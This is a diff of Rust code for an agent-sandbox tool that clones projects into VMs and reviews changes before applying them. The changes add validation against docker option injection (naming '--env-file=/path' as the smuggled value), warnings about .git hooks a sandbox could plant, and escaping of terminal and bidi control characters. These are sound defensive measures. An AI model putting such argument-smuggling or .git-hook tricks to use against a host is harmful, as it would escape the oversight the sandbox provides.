@@ -1,10 +1,11 @@
-//! Agent sandboxes (docs/agent-sandboxes.md): many throwaway VMs, each a full dockerd
+//! Agent sandboxes (README, "Review an agent's changes before applying them" and "Agent
+//! sandboxes have their own workspace and engine"): many throwaway VMs, each a full dockerd
 //! that sees one copy of one project. State lives in `~/.rekcod/sb/<id>`, kept short
 //! because the docker socket path has to fit in `sun_path`.
 
 use std::ffi::CString;
 use std::io::Write;
-use std::os::unix::ffi::OsStrExt;
+use std::os::unix::ffi::{OsStrExt, OsStringExt};
 use std::os::unix::process::CommandExt;
 use std::path::{Component, Path, PathBuf};
 use std::process::{Command, Stdio};
@@ -22,8 +23,10 @@ const DISK_GIB: u64 = 64;
 const DEFAULT_IMAGE: &str = "debian:trixie-slim";
 /// What `golden build` pulls when given no images.
 pub const GOLDEN_IMAGES: &[&str] = &["debian:trixie-slim", "alpine:3.24", "node:lts-slim", "python:3.14-slim"];
-/// Not compared by `diff` or written by `apply`: dirs that stay in the VM. Git's own state
-/// is left out too, under any spelling ([`is_git`]).
+/// Dependency directories that stay in the VM, not compared by `diff` or written by
+/// `apply`: at the project root, or anywhere the project has a directory of that name at
+/// the same path ([`skipped_dir`]). Git's own state is left out too, under any spelling
+/// ([`is_git`]).
 const SKIP: &[&str] = &["node_modules", ".venv", "target"];
 
 /// Whether the Mac's filesystem may take `name` for `.git`: compared without case, and
@@ -43,8 +46,18 @@ pub fn is_git(name: &std::ffi::OsStr) -> bool {
     folded == ".git"
 }
 
-fn skipped(name: &std::ffi::OsStr) -> bool {
-    is_git(name) || SKIP.iter().any(|s| name.as_bytes() == s.as_bytes())
+/// Whether the directory `rel` is a dependency directory left out: a [`SKIP`] name at the
+/// root, or one `project` has as a directory too. A new `src/target/` the sandbox made is
+/// compared like any other directory.
+fn skipped_dir(project: &Dir, rel: &Path) -> bool {
+    let Some(name) = rel.file_name() else { return false };
+    SKIP.iter().any(|s| name.as_bytes() == s.as_bytes())
+        && (rel.parent().is_none_or(|p| p.as_os_str().is_empty()) || project.state(rel).is_some_and(|s| s.kind() == 'd'))
+}
+
+/// Whether `rel` is left out of diff and apply: in `.git`, or under a skipped directory.
+fn left_out(project: &Dir, rel: &Path) -> bool {
+    rel.iter().any(is_git) || rel.ancestors().skip(1).filter(|a| !a.as_os_str().is_empty()).any(|a| skipped_dir(project, a))
 }
 
 /// Egress preset `dev`: package registries, image registries, source hosts, distro mirrors.
@@ -228,7 +241,15 @@ impl Sandbox {
         crate::macos::boot(main, &self.paths.home, self.meta.ttl_secs)
     }
     fn touch(&self) {
-        let _ = std::fs::write(self.paths.home.join("run/last-used"), b"");
+        touch(&self.paths.home.join("run/last-used"));
+    }
+
+    /// Keeps the idle TTL from powering the VM off while the returned guard lives.
+    fn busy(&self) -> Busy {
+        match self.meta.ttl_secs {
+            0 => Busy(None),
+            ttl => Busy::touching(self.paths.home.join("run/last-used"), std::time::Duration::from_secs((ttl / 3).clamp(1, 60))),
+        }
     }
 
     fn boot(&self, main: &Paths) -> Result<()> {
@@ -236,6 +257,10 @@ impl Sandbox {
             return self.guest(main).map(|_| ());
         }
         if self.running() {
+            if self.paused_marker().exists() {
+                // A diff or fork was killed while the workspace was paused.
+                self.unpause();
+            }
             return Ok(());
         }
         let m = &self.meta;
@@ -268,39 +293,151 @@ impl Sandbox {
         Ok(())
     }
 
-    fn start_workspace(&self) -> Result<()> {
+    /// Clones the project into `ws/` and records what was cloned. The manifest is read from
+    /// the clone (clonefile keeps sizes, mtimes and modes): the project may change while
+    /// it's walked, and apply must judge the Mac against what the sandbox actually got.
+    fn copy_project(&self) -> Result<()> {
+        clonefile(&self.meta.project, &self.ws())?;
+        self.save_manifest(&manifest(&self.ws()))
+    }
+
+    fn plan(&self) -> Option<crate::xrun::Plan> {
+        crate::xrun::plan(&self.meta.project, &["sh".into()])
+    }
+
+    /// The project's `.git` entries now, as a `--mount` workspace container sees them.
+    fn git_now(&self) -> crate::xrun::GitEntries {
+        crate::xrun::git_entries(&self.meta.project, &self.plan().map(|p| p.local_dirs).unwrap_or_default())
+    }
+
+    fn git_at_create(&self) -> crate::xrun::GitEntries {
+        std::fs::read(self.paths.home.join("git.json")).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
+    }
+
+    /// `.git` entries a `--mount` sandbox made or replaced in the project since it was
+    /// created, printed as a warning. The binds cover only those that existed then.
+    fn warn_git(&self) -> bool {
+        if self.meta.mode != "mount" || !self.paths.home.join("git.json").exists() {
+            return false;
+        }
+        let made = crate::xrun::new_git_entries(&self.git_at_create(), &self.git_now());
+        if made.is_empty() {
+            return false;
+        }
+        let list: Vec<String> = made.iter().map(|p| printable(&p.to_string_lossy())).collect();
+        eprintln!(
+            "rekcod: sandbox {} made or replaced {} in {}; git on this Mac runs what a .git names, so check it before running git there",
+            self.meta.id,
+            list.join(", "),
+            self.meta.project.display()
+        );
+        true
+    }
+
+    /// `docker run` arguments for the workspace container.
+    fn workspace_args(&self) -> Vec<String> {
         let m = &self.meta;
         let p = m.project.to_string_lossy().to_string();
-        let mut c = self.docker()?;
-        c.args(["run", "-d", "--name", WS, "--restart", "unless-stopped", "--init"]);
+        let mut a: Vec<String> = ["run", "-d", "--name", WS, "--restart", "unless-stopped", "--init"].map(String::from).to_vec();
         // Raw sockets would skip the guest's egress rules; nothing in a workspace needs them.
-        c.args(["--cap-drop", "NET_RAW", "--security-opt", "no-new-privileges"]);
+        a.extend(["--cap-drop", "NET_RAW", "--security-opt", "no-new-privileges"].map(String::from));
         if m.offline {
-            c.args(["--network", "none"]);
+            a.extend(["--network".into(), "none".into()]);
         } else {
-            c.args(["--network", "host", "--label", &format!("{}=1", crate::ports::AUTOPORTS_LABEL)]);
+            a.extend(["--network".into(), "host".into(), "--label".into(), format!("{}=1", crate::ports::AUTOPORTS_LABEL)]);
         }
-        c.args(["-v", &format!("{p}:{p}"), "-w", &p]);
-        if m.mode == "mount" && m.project.join(".git").is_dir() {
+        a.extend(["-v".into(), format!("{p}:{p}"), "-w".into(), p.clone()]);
+        if m.mode == "mount" {
             // A live .git is code the Mac runs: hooks and core.fsmonitor fire on the next
             // `git status`, which shell prompts run on their own.
-            c.args(["-v", &format!("{p}/.git:{p}/.git:ro")]);
+            a.extend(crate::xrun::git_binds(&m.project, &self.git_at_create()));
         }
-        if let Some(plan) = crate::xrun::plan(&m.project, &["sh".into()]) {
+        if let Some(plan) = self.plan() {
             for dir in &plan.local_dirs {
-                c.args(["-v", &format!("{}:{p}/{dir}", crate::xrun::local_volume(&m.project, dir))]);
+                a.extend(["-v".into(), format!("{}:{p}/{dir}", crate::xrun::local_volume(&m.project, dir))]);
             }
         }
         for s in &m.secrets {
-            c.args(["-e", s]);
+            a.extend(["-e".into(), s.clone()]);
         }
-        c.args([&m.image, "sh", "-c", "trap 'exit 0' TERM; while :; do sleep 3600 & wait $!; done"]);
-        let out = c.stdin(Stdio::null()).output().context("run docker")?;
+        a.extend([m.image.clone(), "sh".into(), "-c".into(), "trap 'exit 0' TERM; while :; do sleep 3600 & wait $!; done".into()]);
+        a
+    }
+
+    fn paused_marker(&self) -> PathBuf {
+        self.paths.home.join("run/paused")
+    }
+
+    /// Pauses the workspace container until the guard drops. A marker file outlives a kill
+    /// in between, so the next [`Sandbox::boot`] unpauses it.
+    fn pause(&self) -> Result<Paused<'_>> {
+        touch(&self.paused_marker());
+        let _ = self.docker()?.args(["pause", WS]).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status();
+        Ok(Paused(self))
+    }
+
+    fn unpause(&self) {
+        if let Ok(mut c) = self.docker() {
+            let _ = c.args(["unpause", WS]).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status();
+        }
+        let _ = std::fs::remove_file(self.paused_marker());
+    }
+
+    fn start_workspace(&self) -> Result<()> {
+        let out = self.docker()?.args(self.workspace_args()).stdin(Stdio::null()).output().context("run docker")?;
         if !out.status.success() {
             bail!("starting the workspace container failed: {}", String::from_utf8_lossy(&out.stderr).trim());
         }
         Ok(())
     }
+}
+
+struct Paused<'a>(&'a Sandbox);
+
+impl Drop for Paused<'_> {
+    fn drop(&mut self) {
+        self.0.unpause();
+    }
+}
+
+/// Sets `file`'s mtime to now, creating it if needed: the daemon's idle clock.
+fn touch(file: &Path) {
+    if let Ok(f) = std::fs::OpenOptions::new().create(true).truncate(false).write(true).open(file) {
+        let _ = f.set_modified(SystemTime::now());
+    }
+}
+
+/// Touches a sandbox's `run/last-used` every so often until dropped, so a command or
+/// shell that runs longer than the idle TTL isn't powered off under it.
+pub struct Busy(Option<(std::sync::mpsc::Sender<()>, std::thread::JoinHandle<()>)>);
+
+impl Busy {
+    fn touching(file: PathBuf, every: std::time::Duration) -> Busy {
+        let (tx, rx) = std::sync::mpsc::channel::<()>();
+        let t = std::thread::spawn(move || {
+            loop {
+                touch(&file);
+                if rx.recv_timeout(every) != Err(std::sync::mpsc::RecvTimeoutError::Timeout) {
+                    break;
+                }
+            }
+        });
+        Busy(Some((tx, t)))
+    }
+}
+
+impl Drop for Busy {
+    fn drop(&mut self) {
+        if let Some((tx, t)) = self.0.take() {
+            drop(tx);
+            let _ = t.join();
+        }
+    }
+}
+
+/// [`Busy`] for the sandbox `id`, for the API's execs.
+pub fn busy(paths: &Paths, id: &str) -> Busy {
+    find(paths, id).map(|s| s.busy()).unwrap_or(Busy(None))
 }
 
 fn load(home: &Path) -> Option<Meta> {
@@ -385,10 +522,25 @@ fn check_capacity(paths: &Paths, gib: u64) -> Result<()> {
     Ok(())
 }
 
+/// A container image reference as `docker run` takes it: `[a-zA-Z0-9][a-zA-Z0-9._/:@-]*`.
+/// Anything else, `--env-file=/path` above all, would be read as an option of the docker
+/// CLI on the Mac.
+pub fn check_image(image: &str) -> Result<()> {
+    let ok = image.len() <= 255
+        && image.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
+        && image.bytes().all(|b| b.is_ascii_alphanumeric() || b"._/:@-".contains(&b));
+    if !ok {
+        bail!("bad image {:?}: use a reference like debian:trixie-slim or ghcr.io/org/app@sha256:...", printable_name(image));
+    }
+    Ok(())
+}
+
 pub fn create(paths: &Paths, o: CreateOptions) -> Result<Meta> {
     check_name("golden disk", &o.golden)?;
-    if let Some(img) = o.image.as_deref().filter(|_| o.os.as_deref() == Some("macos")) {
-        check_name("macOS image", img)?;
+    match o.image.as_deref() {
+        Some(img) if o.os.as_deref() == Some("macos") => check_name("macOS image", img)?,
+        Some(img) => check_image(img)?,
+        None => {}
     }
     let project = o.dir.clone().map_or_else(std::env::current_dir, Ok)?.canonicalize()?;
     if !["/Users", "/Volumes", "/private"].iter().any(|r| project.starts_with(r)) {
@@ -427,11 +579,18 @@ pub fn create(paths: &Paths, o: CreateOptions) -> Result<Meta> {
     }
     let memory_gib = if macos { o.memory_gib.max(8) } else { o.memory_gib };
     check_capacity(paths, memory_gib)?;
+    std::fs::create_dir_all(root(paths))?;
+    if !o.mount || macos {
+        use std::os::unix::fs::MetadataExt;
+        if std::fs::metadata(&project)?.dev() != std::fs::metadata(root(paths))?.dev() {
+            bail!("a sandbox clones the project, so it must be on the same volume as {}; use --mount", paths.home.display());
+        }
+    }
     let t0 = Instant::now();
     let id = new_id()?;
-    std::fs::create_dir_all(root(paths))?;
     crate::cli::exclude_from_backups(&root(paths));
     let sb = Paths::at(root(paths).join(&id))?;
+    let unmade = Unmade(Some(sb.home.clone()));
     let golden = golden_home(paths, &o.golden).join("vm/data.img");
     let golden = if macos {
         if let Err(e) = crate::macos::clone_image(paths, o.image.as_deref().unwrap_or("default"), &sb.home, o.cpus, memory_gib) {
@@ -473,8 +632,9 @@ pub fn create(paths: &Paths, o: CreateOptions) -> Result<Meta> {
         paths: sb,
     };
     if !o.mount || macos {
-        clonefile(&project, &s.ws())?;
-        s.save_manifest(&manifest(&project))?;
+        s.copy_project()?;
+    } else {
+        std::fs::write(s.paths.home.join("git.json"), serde_json::to_vec(&s.git_now())?)?;
     }
     s.save()?;
     let result = if macos {
@@ -486,8 +646,29 @@ pub fn create(paths: &Paths, o: CreateOptions) -> Result<Meta> {
         let _ = remove(&s);
         return Err(e);
     }
+    unmade.done();
     eprintln!("rekcod: sandbox {id} ready in {:.1}s", t0.elapsed().as_secs_f64());
     Ok(s.meta)
+}
+
+/// Removes a sandbox directory being made unless [`Unmade::done`] is called: an early
+/// return would otherwise leave a cloned disk under `sb/` that `ls` and `rm --all` never
+/// see, since they list only directories with a meta.json.
+struct Unmade(Option<PathBuf>);
+
+impl Unmade {
+    fn done(mut self) {
+        self.0 = None;
+    }
+}
+
+impl Drop for Unmade {
+    fn drop(&mut self) {
+        if let Some(home) = self.0.take() {
+            open_up(&home);
+            let _ = std::fs::remove_dir_all(home);
+        }
+    }
 }
 
 fn log_exec(s: &Sandbox, cmd: &[String], cwd: &str, exit: i32, ms: u128) {
@@ -535,7 +716,7 @@ pub fn exec(paths: &Paths, id: &str, o: ExecOptions, cmd: &[String]) -> Result<i
     }
     let s = find(paths, id)?;
     s.boot(paths)?;
-    s.touch();
+    let _busy = s.busy();
     let t0 = Instant::now();
     let code = if s.macos() {
         let ip = s.guest(paths)?;
@@ -549,6 +730,7 @@ pub fn exec(paths: &Paths, id: &str, o: ExecOptions, cmd: &[String]) -> Result<i
     let cwd = o.workdir.clone().unwrap_or_else(|| s.meta.project.to_string_lossy().into());
     log_exec(&s, cmd, &cwd, code, t0.elapsed().as_millis());
     s.touch();
+    s.warn_git();
     Ok(code)
 }
 
@@ -578,19 +760,28 @@ pub fn record(paths: &Paths, id: &str, cmd: &[String], exit: i32, ms: u128) {
     }
 }
 
-pub fn shell(paths: &Paths, id: &str) -> Result<()> {
+/// An interactive shell in the sandbox; returns its exit code. Run as a child, not `exec`ed,
+/// so the idle TTL keeps counting it as use.
+pub fn shell(paths: &Paths, id: &str) -> Result<i32> {
     let s = find(paths, id)?;
-    if s.macos() {
+    let mut c = if s.macos() {
         let ip = s.guest(paths)?;
         let sh = ["/bin/zsh".to_string(), "-l".to_string()];
-        return Err(crate::macos::exec_command(paths, &ip, None, &[], &sh, true)?.exec()).context("exec ssh");
-    }
-    s.boot(paths)?;
+        crate::macos::exec_command(paths, &ip, None, &[], &sh, true)?
+    } else {
+        s.boot(paths)?;
+        let tty = unsafe { libc::isatty(0) == 1 };
+        let o = ExecOptions { workdir: None, env: vec![], timeout_secs: None, tty, clean_env: false };
+        let sh = ["sh", "-c", "command -v bash >/dev/null && exec bash || exec sh"].map(String::from);
+        let mut c = s.docker()?;
+        c.args(exec_args(&s.meta, &o, &sh));
+        c
+    };
+    let _busy = s.busy();
+    let code = c.status().context("run the shell")?.code().unwrap_or(1);
     s.touch();
-    let tty = unsafe { libc::isatty(0) == 1 };
-    let o = ExecOptions { workdir: None, env: vec![], timeout_secs: None, tty, clean_env: false };
-    let sh = ["sh", "-c", "command -v bash >/dev/null && exec bash || exec sh"].map(String::from);
-    Err(s.docker()?.args(exec_args(&s.meta, &o, &sh)).exec()).context("exec docker")
+    s.warn_git();
+    Ok(code)
 }
 
 /// `ID:/path` becomes the workspace container's path; anything else is a Mac path.
@@ -606,13 +797,7 @@ pub fn cp(paths: &Paths, src: &str, dst: &str) -> Result<()> {
         let ip = s.guest(paths)?;
         let remote = |a: &str| a.strip_prefix(&format!("{WS}:")).map(|p| format!("{}@{ip}:{p}", crate::macos::USER));
         let args: Vec<String> = args.iter().map(|a| remote(a).unwrap_or_else(|| a.clone())).collect();
-        let key = crate::macos::key(paths)?;
-        let ok = Command::new("scp")
-            .args(["-q", "-r", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-i"])
-            .arg(key)
-            .args(&args)
-            .status()?
-            .success();
+        let ok = crate::macos::scp_command(paths)?.args(&args).status()?.success();
         if !ok {
             bail!("scp failed");
         }
@@ -623,6 +808,25 @@ pub fn cp(paths: &Paths, src: &str, dst: &str) -> Result<()> {
     let ok = s.docker()?.arg("cp").args(&args).status()?.success();
     if !ok {
         bail!("docker cp failed");
+    }
+    Ok(())
+}
+
+/// A fork's workspace and the manifest that goes with it: the child's apply must judge the
+/// Mac's files against what the parent copied, not guess from times.
+fn clone_workspace(parent: &Sandbox, child: &Path) -> Result<()> {
+    if parent.meta.mode != "copy" {
+        // A --mount fork shares the same project: it warns about the same new .git entries.
+        let git = parent.paths.home.join("git.json");
+        if git.exists() {
+            std::fs::copy(git, child.join("git.json"))?;
+        }
+        return Ok(());
+    }
+    clonefile(&parent.ws(), &child.join("ws"))?;
+    let manifest = parent.paths.home.join("manifest.json");
+    if manifest.exists() {
+        clonefile(&manifest, &child.join("manifest.json"))?;
     }
     Ok(())
 }
@@ -639,6 +843,7 @@ pub fn fork(paths: &Paths, id: &str, name: Option<String>) -> Result<Meta> {
     let t0 = Instant::now();
     let new = new_id()?;
     let child_paths = Paths::at(root(paths).join(&new))?;
+    let unmade = Unmade(Some(child_paths.home.clone()));
     let running = parent.running();
     if parent.macos() {
         let n = macos_running(paths);
@@ -648,39 +853,40 @@ pub fn fork(paths: &Paths, id: &str, name: Option<String>) -> Result<Meta> {
         if running {
             // No pause for macOS guests: flush, then clone what's on disk.
             let ip = parent.guest(paths)?;
-            let _ = crate::macos::exec_command(paths, &ip, Some("/"), &[], &["sync".into()], false)?.status();
+            let _ = crate::macos::exec_command(paths, &ip, Some("/"), &[], &["sync".into()], false)?.stdin(Stdio::null()).status();
             let _lock = review_lock(&parent.paths.home)?;
             crate::macos::pull_ws(paths, &ip, &parent.ws())?;
         }
         for f in ["disk.img", "aux.img", "hw.bin", "config.json"] {
             clonefile(&parent.paths.home.join(f), &child_paths.home.join(f))?;
         }
-        clonefile(&parent.ws(), &child_paths.home.join("ws"))?;
+        clone_workspace(&parent, &child_paths.home)?;
         crate::macos::reidentify(&child_paths.home)?;
         let child = Sandbox { meta: Meta { id: new.clone(), name, ..parent.meta.clone() }, paths: child_paths };
         if let Err(e) = child.save().and_then(|_| child.boot(paths)) {
             let _ = remove(&child);
             return Err(e);
         }
+        unmade.done();
         eprintln!("rekcod: sandbox {new} forked from {} in {:.1}s", parent.meta.id, t0.elapsed().as_secs_f64());
         return Ok(child.meta);
     }
-    if running {
+    let paused = if running {
         // Flush, then freeze the workspace's processes while the disk is cloned. dockerd
         // keeps running, so the clone is crash-consistent, like a power cut.
-        let _ = parent.docker()?.args(["exec", WS, "sync"]).status();
-        let _ = parent.docker()?.args(["pause", WS]).stdout(Stdio::null()).status();
-    }
-    let cloned = clonefile(&parent.paths.data_disk(), &child_paths.data_disk())
-        .and_then(|_| if parent.meta.mode == "copy" { clonefile(&parent.ws(), &child_paths.home.join("ws")) } else { Ok(()) });
-    if running {
-        let _ = parent.docker()?.args(["unpause", WS]).stdout(Stdio::null()).status();
-    }
+        let _ = parent.docker()?.args(["exec", WS, "sync"]).stdin(Stdio::null()).status();
+        Some(parent.pause()?)
+    } else {
+        None
+    };
+    let cloned = clonefile(&parent.paths.data_disk(), &child_paths.data_disk()).and_then(|_| clone_workspace(&parent, &child_paths.home));
+    drop(paused);
     let child = Sandbox { meta: Meta { id: new.clone(), name, ..parent.meta.clone() }, paths: child_paths };
     if let Err(e) = cloned.and_then(|_| child.save()).and_then(|_| child.boot(paths)) {
         let _ = remove(&child);
         return Err(e);
     }
+    unmade.done();
     eprintln!("rekcod: sandbox {new} forked from {} in {:.1}s", parent.meta.id, t0.elapsed().as_secs_f64());
     Ok(child.meta)
 }
@@ -692,22 +898,25 @@ pub struct Change {
     pub path: String,
 }
 
-/// Directories (`d`), regular files (`f`) and symlinks (`l`) under `base`, without what
-/// [`skipped`] leaves out. FIFOs, sockets and devices are left out too: reading a FIFO the
+/// Directories (`d`), regular files (`f`) and symlinks (`l`) under `base`, and the
+/// directories [`skipped_dir`] leaves out (`s`, not entered), judged against `project`.
+/// `.git` isn't listed. FIFOs, sockets and devices are left out too: reading a FIFO the
 /// sandbox made would hang `diff`. Symlinked directories are listed, not entered.
-fn walk(base: &Path) -> Vec<(PathBuf, char)> {
-    fn into(base: &Path, rel: &Path, out: &mut Vec<(PathBuf, char)>) {
+fn walk(base: &Path, project: &Dir) -> Vec<(PathBuf, char)> {
+    fn into(base: &Path, project: &Dir, rel: &Path, out: &mut Vec<(PathBuf, char)>) {
         let Ok(rd) = std::fs::read_dir(base.join(rel)) else { return };
         for e in rd.flatten() {
             let name = e.file_name();
-            if skipped(&name) {
+            // A `.git`, or a file a killed apply was writing.
+            if is_git(&name) || crate::safefs::is_temp(&name) {
                 continue;
             }
             let r = rel.join(&name);
             match e.file_type() {
+                Ok(t) if t.is_dir() && skipped_dir(project, &r) => out.push((r, 's')),
                 Ok(t) if t.is_dir() => {
                     out.push((r.clone(), 'd'));
-                    into(base, &r, out);
+                    into(base, project, &r, out);
                 }
                 Ok(t) if t.is_file() => out.push((r, 'f')),
                 Ok(t) if t.is_symlink() => out.push((r, 'l')),
@@ -716,13 +925,13 @@ fn walk(base: &Path) -> Vec<(PathBuf, char)> {
         }
     }
     let mut out = Vec::new();
-    into(base, Path::new(""), &mut out);
+    into(base, project, Path::new(""), &mut out);
     out
 }
 
-/// What [`walk`] finds that `diff` compares: files and symlinks.
-fn files(base: &Path) -> std::collections::BTreeSet<PathBuf> {
-    walk(base).into_iter().filter(|(_, k)| *k != 'd').map(|(p, _)| p).collect()
+/// What [`walk`] finds that `diff` compares, by path: directories, files and symlinks.
+fn entries(base: &Path, project: &Dir) -> std::collections::BTreeMap<PathBuf, char> {
+    walk(base, project).into_iter().filter(|(_, k)| *k != 's').collect()
 }
 
 fn open_nofollow(p: &Path) -> std::io::Result<std::fs::File> {
@@ -752,25 +961,45 @@ fn same(a: &Path, b: &Path) -> bool {
     }
     // The bits `apply` writes; it drops setuid, setgid and sticky.
     let mode = |m: &std::fs::Metadata| std::os::unix::fs::PermissionsExt::mode(&m.permissions()) & 0o777;
+    if ma.is_dir() && mb.is_dir() {
+        return mode(&ma) == mode(&mb);
+    }
     ma.len() == mb.len() && mode(&ma) == mode(&mb) && same_bytes(a, b)
 }
 
-/// What `apply` would do to `project` to make it match `ws`.
+/// What `apply` would do to `project` to make it match `ws`. Directories are changes of
+/// their own (made with their mode, removed once emptied, chmodded); a directory and a file
+/// swapped for each other show as the file's addition or deletion and the directory's
+/// contents.
 pub fn changes(project: &Path, ws: &Path) -> Vec<Change> {
-    let (a, b) = (files(project), files(ws));
+    let Ok(pd) = Dir::open(project) else { return vec![] };
+    let (a, b) = (entries(project, &pd), entries(ws, &pd));
     let mut out: Vec<Change> = Vec::new();
-    for p in b.iter() {
-        if !a.contains(p) {
-            out.push(Change { kind: 'A', path: p.to_string_lossy().into() });
-        } else if !same(&project.join(p), &ws.join(p)) {
-            out.push(Change { kind: 'M', path: p.to_string_lossy().into() });
+    let change = |kind, p: &PathBuf| Change { kind, path: p.to_string_lossy().into() };
+    for (p, k) in b.iter() {
+        match (a.get(p), *k) {
+            (None, _) => out.push(change('A', p)),
+            (Some('d'), 'd') if !same(&project.join(p), &ws.join(p)) => out.push(change('M', p)),
+            (Some('d'), 'd') => {}
+            // A file or link put where the project has a directory.
+            (Some('d'), _) => out.push(change('A', p)),
+            // A directory where the project has a file or link: the file goes.
+            (Some(_), 'd') => out.push(change('D', p)),
+            (Some(_), _) if !same(&project.join(p), &ws.join(p)) => out.push(change('M', p)),
+            (Some(_), _) => {}
         }
     }
-    for p in a.difference(&b) {
-        out.push(Change { kind: 'D', path: p.to_string_lossy().into() });
+    for (p, _) in a.iter().filter(|(p, _)| !b.contains_key(*p)) {
+        out.push(change('D', p));
     }
     out.sort_by(|x, y| x.path.cmp(&y.path));
     out
+}
+
+/// Directories in the workspace diff and apply leave alone, for the reviewer to know.
+pub fn not_compared(project: &Path, ws: &Path) -> Vec<String> {
+    let Ok(pd) = Dir::open(project) else { return vec![] };
+    walk(ws, &pd).into_iter().filter(|(_, k)| *k == 's').map(|(p, _)| p.to_string_lossy().into()).collect()
 }
 
 /// The project as the sandbox copied it: path to (kind, size, mtime ns, mode), directories
@@ -779,7 +1008,7 @@ type Manifest = std::collections::BTreeMap<String, State>;
 
 fn manifest(project: &Path) -> Manifest {
     let Ok(dir) = Dir::open(project) else { return Manifest::new() };
-    walk(project).iter().filter_map(|(f, _)| Some((f.to_string_lossy().to_string(), dir.state(f)?))).collect()
+    entries(project, &dir).keys().filter_map(|f| Some((f.to_string_lossy().to_string(), dir.state(f)?))).collect()
 }
 
 /// Held across `diff`, `apply` and anything that replaces `ws/`, so what `apply --reviewed`
@@ -815,72 +1044,253 @@ fn freeze(s: &Sandbox, name: &str) -> Result<PathBuf> {
             std::fs::remove_dir_all(d)?;
         }
     }
-    let pause = !s.macos() && s.running();
-    if pause {
-        let _ = s.docker()?.args(["pause", WS]).stdout(Stdio::null()).stderr(Stdio::null()).status();
-    }
+    let paused = if !s.macos() && s.running() { Some(s.pause()?) } else { None };
     let r = clonefile(&s.ws(), &tmp);
-    if pause {
-        let _ = s.docker()?.args(["unpause", WS]).stdout(Stdio::null()).stderr(Stdio::null()).status();
+    drop(paused);
+    if r.is_err()
+        && let Some(p) = unreadable(&s.ws(), Path::new(""))
+    {
+        let _ = std::fs::remove_dir_all(&tmp);
+        bail!(
+            "{} in the workspace can't be read (its mode leaves the owner out); `chmod u+rwX` it in the sandbox",
+            printable_name(&p.to_string_lossy())
+        );
     }
     r?;
     std::fs::rename(&tmp, &dst)?;
     Ok(dst)
 }
 
-/// Bytes a terminal would act on (escape sequences can hide lines from the reviewer),
-/// shown as `^[` style text instead. Newlines and tabs stay.
+/// Bytes a terminal would act on (escape sequences can hide lines from the reviewer), and
+/// the bidirectional controls that reorder what it shows, as `^[` or `\u{..}` text
+/// instead. Newlines and tabs stay.
 pub fn printable(text: &str) -> String {
     text.chars()
         .map(|c| match c {
             '\n' | '\t' => c.to_string(),
             c if (c as u32) < 0x20 => format!("^{}", ((c as u8) + 0x40) as char),
             '\u{7f}' => "^?".into(),
-            c if ('\u{80}'..='\u{9f}').contains(&c) => format!("\\u{{{:x}}}", c as u32),
+            c if matches!(c, '\u{80}'..='\u{9f}' | '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}') => {
+                format!("\\u{{{:x}}}", c as u32)
+            }
             c => c.to_string(),
         })
         .collect()
 }
 
-/// Unified diff of the workspace against the project (`git diff --no-index` per file). The
-/// workspace is frozen into `<sandbox>/reviewed`, which `apply --reviewed` writes back.
-pub fn patch(paths: &Paths, id: &str) -> Result<(Vec<Change>, String)> {
+/// What `diff` showed: the change list, the patch, and the review ID `apply --reviewed`
+/// takes to write exactly that.
+#[derive(Serialize, Debug)]
+pub struct Review {
+    pub changes: Vec<Change>,
+    pub patch: String,
+    pub review: String,
+    /// Dependency directories in the workspace that diff and apply leave alone.
+    pub not_compared: Vec<String>,
+}
+
+/// SHA-256 over the change list and, for each path written, its kind, mode and content (or
+/// link target) in the frozen copy `src`. Every field is length-prefixed: paths come from
+/// the sandbox. 128 bits, so finding two workspaces with one ID costs 2^64 hashes.
+fn review_id(src: &Path, ch: &[Change]) -> Result<String> {
+    use sha2::{Digest, Sha256};
+    use std::io::Read;
+    let from = Dir::open(src)?;
+    let mut h = Sha256::new();
+    let field = |h: &mut Sha256, b: &[u8]| {
+        h.update((b.len() as u64).to_be_bytes());
+        h.update(b);
+    };
+    for c in ch {
+        field(&mut h, &[c.kind as u8]);
+        field(&mut h, c.path.as_bytes());
+        if c.kind == 'D' {
+            continue;
+        }
+        let rel = Path::new(&c.path);
+        let st = from.state(rel).with_context(|| format!("{} is gone from the reviewed copy", c.path))?;
+        field(&mut h, &[st.kind() as u8]);
+        field(&mut h, &st.3.unwrap_or(0).to_be_bytes());
+        if st.kind() == 'd' {
+            continue;
+        }
+        if st.kind() == 'l' {
+            field(&mut h, from.read_link(rel)?.as_os_str().as_bytes());
+        } else {
+            let mut f = from.open_file(rel)?;
+            let mut content = Sha256::new();
+            let mut buf = vec![0u8; 1 << 16];
+            loop {
+                let n = f.read(&mut buf)?;
+                if n == 0 {
+                    break;
+                }
+                content.update(&buf[..n]);
+            }
+            field(&mut h, &content.finalize());
+        }
+    }
+    Ok(h.finalize()[..16].iter().map(|b| format!("{b:02x}")).collect())
+}
+
+/// Largest file `diff` shows line by line; a bigger one gets a line with its sizes.
+const MAX_DIFF_FILE: u64 = 4 << 20;
+/// Largest patch the API returns; the CLI prints as it goes and has no limit.
+const MAX_PATCH: usize = 32 << 20;
+
+/// A path as `diff` prints it: [`printable`], with newlines and tabs escaped too, so a
+/// name can't start a line of its own.
+pub fn printable_name(name: &str) -> String {
+    printable(name).replace('\n', "^J").replace('\t', "^I")
+}
+
+/// One side of a change: what's at the path, read without following any link.
+enum Side {
+    None,
+    Dir(u32),
+    /// Permission bits (as `apply` writes them) and content; None when over [`MAX_DIFF_FILE`].
+    File(u32, u64, Option<Vec<u8>>),
+    Link(PathBuf),
+}
+
+fn side(dir: &Dir, rel: &Path) -> Result<Side> {
+    use std::io::Read;
+    let Some(st) = dir.state(rel) else { return Ok(Side::None) };
+    let mode = st.3.unwrap_or(0o644) & 0o777;
+    match st.kind() {
+        'l' => return Ok(Side::Link(dir.read_link(rel)?)),
+        'd' => return Ok(Side::Dir(mode)),
+        'f' => {}
+        _ => return Ok(Side::None),
+    }
+    if st.1 > MAX_DIFF_FILE {
+        return Ok(Side::File(mode, st.1, None));
+    }
+    let mut b = Vec::new();
+    dir.open_file(rel)?.take(MAX_DIFF_FILE + 1).read_to_end(&mut b)?;
+    let len = b.len() as u64;
+    Ok(Side::File(mode, len, (len <= MAX_DIFF_FILE).then_some(b)))
+}
+
+/// The unified diff of one change, from the project `old` to the frozen copy `new`. Written
